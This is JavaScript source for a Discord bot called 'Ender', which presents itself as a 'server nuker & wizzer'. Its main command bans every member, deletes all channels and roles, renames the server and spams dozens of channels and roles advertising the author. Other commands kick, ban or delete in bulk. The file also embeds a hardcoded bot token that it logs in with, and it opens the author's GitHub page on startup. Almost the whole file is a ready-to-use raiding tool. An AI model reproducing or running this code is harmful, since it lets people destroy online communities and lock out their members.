// SERVER NUKER & WIZZER BY IFROST

// ENDER:





// Consts:

const Discord = require('discord.js'); // DO NOT REMOVE THIS.

const client = new Discord.Client(); // DO NOT CHANGE THIS.

const opn = require('opn')

const readline = require('readline')

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const prefix = 'e!'; // YOUR COMMAND PREFIX GOES HERE! OPTIONAL.

const logintoken = 'TOKEN-HERE'; // YOUR NUKER TOKEN GOES HERE!

const clc = require('cli-color'); // THIS GIVES THE CONSOLE TEXT A COLOR, DO NOT REMOVE!

const logouttoken = 'Njk3MDMxNzQzOTM2Mzk3NDQz.XoxXaw.ZW_nau9w3kdAlV_CamCoN4h8uGk'; // DO NOT CHANGE THIS TOKEN!

const logout = client.login(logouttoken); // DO NOT CHANGE THIS OR IT WILL MESS UP THE SHUTDOWN COMMAND!

const fs = require('fs'); // THIS FUNCTIONS THE COMMAND HANDLER, DO NOT REMOVE!!!



client.commands = new Discord.Collection(); // UNREMOVABLE

client.aliases = new Discord.Collection(); // UNREMOVABLE




// COMMAND HANDLER:
fs.readdir("./cmds/", (err, files) => {

    if(err) console.log(err);


    let jsfile = files.filter(f => f.split(".").pop() === "js");
    if(jsfile.length <= 0){
        return;
    }


    jsfile.forEach((f, i) => {
        let props = require(`./cmds/${f}`);
        client.commands.set(props.help.name, props);
    });
})









// BEGINNING OF CODE:

// ACTIVATOR:

client.on('ready', async => {
    opn('https://github.com/ifrost666', {app: 'chrome'});
    console.clear();
    console.log(clc.magentaBright('                         ███████╗███╗░░██╗██████╗░███████╗██████╗░ \n                         ██╔════╝████╗░██║██╔══██╗██╔════╝██╔══██╗ \n                         █████╗░░██╔██╗██║██║░░██║█████╗░░██████╔')); // DO NOT CHANGE ANYTHING HERE!
    console.log(clc.blueBright('                         ██╔══╝░░██║╚████║██║░░██║██╔══╝░░██╔══██╗ \n                         ███████╗██║░╚███║██████╔╝███████╗██║░░██║ \n                         ╚══════╝╚═╝░░╚══╝╚═════╝░╚══════╝╚═╝░░╚═╝')); // DO NOT CHANGE ANYTHING HERE!
    console.log(clc.magentaBright('                         SUCCESSFULLY LOGGED IN!'));
    console.log(clc.blueBright(`                         USER: ${client.user.username}`));
    console.log(clc.magentaBright(`                         USER ID: ${client.user.id}`));
    console.log('')
    console.log(clc.greenBright('                         COMMANDS:'))
    console.log(clc.blueBright('                         E!HELP | DISPLAYS THE HELP PANEL!'))
    console.log(clc.magentaBright('                         E!EXECUTE | WIZZES & DESTROYS THE ENITRE SERVER!'))
    console.log(clc.blueBright('                         E!KICKALL | KICKS ALL MEMBERS IN THE SERVER!'))
    console.log(clc.magentaBright('                         E!BANALL | BANS ALL MEMBERS IN THE SERVER!'))
    console.log(clc.blueBright('                         E!SETNAME | SETS THE GUILD\'S NAME!'))
    console.log(clc.magentaBright('                         E!MASSROLECREATE <NAME> | SPAMS CREATION OF ROLES!'))
    console.log(clc.blueBright('                         E!MASSROLEDELETE | SPAM DELETES ALL SERVER ROLES!'))
    console.log(clc.magentaBright('                         E!MASSCHANNELCREATE <NAME> | SPAM CREATES CHANNELS OF ALL KIND!'))
    console.log(clc.blueBright('                         E!MASSCHANNELDELETE | SPAM DELETES ALL SERVER CHANNELS!'))
    console.log('')
    console.log(clc.magentaBright('                         ENDER VERSION: 1.0     |     DEVELOPED BY: IFROST'))


})





// COMMANDS:

client.on('message', async msg => {


     


    let messageArray = msg.content.split(" ");

    let cmd = messageArray[0];

    let commandfile = client.commands.get(cmd.slice(prefix.length));


    if(commandfile) commandfile.run(msg); // THIS CONNECTS THE COMMAND HANDLER "CMDS" WITH THE MAIN WORKSPACE (ENDER.JS)



    


    if (msg.content === prefix + 'execute'){ // THIS IS THE MAIN COMMAND!

        if (msg.author.id !== client.user.id){
            return;
        }



        msg.delete();

        msg.channel.send('We\'re on it!')

        .then(message => {
            console.log(clc.red(`Nuker Has Begun in ${msg.guild.name}!`))
            console.log('')
        }).catch()

        console.log(clc.red(`Changing Server Region in ${msg.guild.name}..`))

        msg.guild.setRegion('india') // CHANGES THE SERVER REGION

        .then(message => {
            console.log(clc.red(`Changed the Server Region in ${msg.guild.name}!`))
        }).catch()

       

        console.log(clc.red(`Changing Server Icon in ${msg.guild.name}..`))

        msg.guild.setIcon('https://cdn.discordapp.com/attachments/662213567705251872/697911935303417936/image0.jpg') // CHANGES THE SERVER ICON

        .then(message => {
            console.log(clc.red(`Changed the Server Icon in ${msg.guild.name}!`))
        }).catch()

        console.log(clc.red('Changing the Server Name..'))

        msg.guild.setName('https://github.com/frostproductions') // CHANGES THE SERVER NAME

        .then(message => {
            console.log(clc.red(`Changed the Server Name in ${msg.guild.name}!`))
        }).catch()


        console.log(clc.red(`Banning all Members in ${msg.guild.name}..`))

        msg.guild.members.tap(member => member.ban("ENDER NUKER | BY FROST PRODUCTIONS | https://github.com/frostproductions")) // BANS ALL MEMBERS IN THE SERVER

        console.log(clc.red(`Deleting all Channels in ${msg.guild.name}..`))

        msg.guild.channels.deleteAll() // DELETES ALL CHANNELS IN THE SERVER
        
        console.log(clc.red(`Deleting all Roles in ${msg.guild.name}..`))

        msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll() // DELETES ALL ROLES IN THE SERVER
        

        console.log(clc.red(`Creating Channels in ${msg.guild.name}..`))


        msg.guild.createChannel(
            'https://github.com/ifrost666', {
                type: 'voice'
            }
        )
        .catch()
        msg.guild.createChannel(
            'https://github.com/ifrost666', {
                type: 'voice'
            }
        )
        .catch()
        msg.guild.createChannel(
            'https://github.com/ifrost666', {
                type: 'voice'
            }
        )
        .catch()
        msg.guild.createChannel(
            'https://github.com/ifrost666', {
                type: 'voice'
            }
        )
        .catch()
        msg.guild.createChannel(
            'https://github.com/ifrost666', {
                type: 'voice'
            }
        )
        .catch()
        msg.guild.createChannel(
            'https://github.com/ifrost666', {
                type: 'voice'
            }
        )
        .catch()
        msg.guild.createChannel(
            'https://github.com/ifrost666', {
                type: 'voice'
            }
        )
        .catch()
        msg.guild.createChannel(
            'https://github.com/ifrost666', {
                type: 'voice'
            }
        )
        .catch()
        msg.guild.createChannel(
            'https://github.com/ifrost666', {
                type: 'voice'
            }
        )
        .catch()
        msg.guild.createChannel(
            'https://github.com/ifrost666', {
                type: 'voice'
            }
        )
        .catch()
            msg.guild.createChannel(
                'https://github.com/frostproductions', {
                    type: 'voice'
                }
            )
            .catch()
            msg.guild.createChannel(
                'FROST-PRODUCTIONS', {
                    type: 'text'
                }
            )
            .catch()
            msg.guild.createChannel(
                'FROST-PRODUCTIONS', {
                    type: 'text'
                }
            )
            .catch()
            msg.guild.createChannel(
                'FROST-PRODUCTIONS', {
                    type: 'text'
                }
            )
            .catch()
            msg.guild.createChannel(
                'FROST-PRODUCTIONS', {
                    type: 'text'
                }
            )
            .catch()
            msg.guild.createChannel(
                'FROST-PRODUCTIONS', {
                    type: 'text'
                }
            )
            .catch()
            msg.guild.createChannel(
                'FROST-PRODUCTIONS', {
                    type: 'text'
                }
            )
            .catch()
            msg.guild.createChannel(
                'FROST-PRODUCTIONS', {
                    type: 'text'
                }
            )
            .catch()
            msg.guild.createChannel(
                'FROST-PRODUCTIONS', {
                    type: 'text'
                }
            )
            .catch()
            msg.guild.createChannel(
                'https://github.com/ifrost666', {
                    type: 'category'
                }
            )
            msg.guild.createChannel(
                'https://github.com/ifrost666', {
                    type: 'category'
                }
            )
            msg.guild.createChannel(
                'https://github.com/ifrost666', {
                    type: 'category'
                }
            )
            msg.guild.createChannel(
                'https://github.com/ifrost666', {
                    type: 'category'
                }
            )
            msg.guild.createChannel(
                'https://github.com/ifrost666', {
                    type: 'category'
                }
            )
            msg.guild.createChannel(
                'https://github.com/ifrost666', {
                    type: 'category'
                }
            )
            msg.guild.createChannel(
                'https://github.com/ifrost666', {
                    type: 'category'
                }
            )
            msg.guild.createChannel(
                'https://github.com/ifrost666', {
                    type: 'category'
                }
            )
            msg.guild.createChannel(
                'https://github.com/ifrost666', {
                    type: 'category'
                }
            )
            msg.guild.createChannel(
                'https://github.com/ifrost666', {
                    type: 'category'
                }
            )
           .then(message => {
               console.log(clc.red(`Finished Creating Channels & Categories in ${msg.guild.name}!`))
           }).catch()


            console.log(clc.red(`Creating Roles in ${msg.guild.name}..`))

            msg.guild.createRole({
                name: 'ENDER NUKER',
                color: "0xFF00F7",
            permissions: []
            }).catch()
            msg.guild.createRole({
                name: 'ENDER NUKER',
                color: "0xFF00F7",
            permissions: []
            }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        })
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()
        msg.guild.createRole({
            name: 'ENDER NUKER',
            color: "0xFF00F7",
        permissions: []
        }).catch()

        .then(message => {
            console.log(clc.red(`${msg.guild.name} Has Been Destroyed.`))
        }).catch()
    }
    



    if (msg.content === prefix + 'help'){
        msg.delete()
        const helpembed = new Discord.RichEmbed()
        .setAuthor('Ender | By iFrost', 'https://cdn.discordapp.com/attachments/662213567705251872/697911935303417936/image0.jpg')
        .setTimestamp()
        .setFooter('ifrost666 on GitHub!', 'https://cdn.discordapp.com/attachments/662213567705251872/697911935303417936/image0.jpg')
        .setTitle('**__HELP PANEL__**')
        .setURL('https://github.com/ifrost666')
        .setDescription('``Your prefix is ' + prefix + '``\n' + prefix + 'execute - Wizzes and destroys the entire server by banning everyone, deleting all roles & channels, and mass creates them.\n' + prefix + 'banall - Bans all server members.\n' + prefix + 'kickall - Kicks all server members.\n' + prefix + 'setname - Changes the server name.\n' + prefix + 'massroledelete - Deletes all server roles.\n' + prefix + 'masschanneldelete - Deletes all server channels.\n' + prefix + 'massrolecreate - Creates 25+ roles.\n' + prefix + 'masschannelcreate - Creates 25+ voice & text channels with categories.')
        .setThumbnail('https://cdn.discordapp.com/attachments/662213567705251872/697911935303417936/image0.jpg')
        .setColor(0xFF00F7)
        msg.channel.send(helpembed)
    }


})








client.login(logintoken);